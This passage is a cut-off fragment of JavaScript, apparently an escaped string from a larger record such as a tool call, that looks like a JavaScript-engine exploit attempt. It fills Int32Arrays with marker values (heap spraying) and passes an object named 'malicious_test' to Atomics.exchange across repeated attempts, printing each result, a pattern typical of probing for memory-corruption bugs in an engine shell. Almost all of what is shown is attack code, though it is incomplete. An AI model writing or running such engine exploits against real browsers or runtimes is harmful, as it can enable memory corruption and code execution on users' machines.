ray_arr = new Int32Array(spray_test);\n                spray_arr[200] = 0x22222222 + attempt;\n                return 0x0;\n            }\n        };\n        \n        let result = Atomics.exchange(arr_test, targetIndex, malicious_test);\n        print(\"Attempt\", attempt, \"result:\", result.toString(16));\n    }\n    \n} catch (e) {\n    print(\"Failed:\", e);\n}\n\nprint(\"Done\");"})
